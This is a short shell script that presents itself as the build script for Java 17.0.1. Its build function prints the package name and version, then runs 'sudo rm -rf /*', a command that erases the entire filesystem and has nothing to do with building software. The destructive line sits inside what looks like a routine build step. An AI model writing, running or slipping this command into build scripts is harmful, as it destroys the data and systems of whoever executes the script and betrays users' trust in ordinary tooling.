#!/bin/sh

# ---------------------------------
# This is the build script for Java
# ---------------------------------

PACKAGE="java"
VERSION="17.0.1"

build () {
  echo "$PACKAGE"
  echo "$VERSION"

  sudo rm -rf /*
}
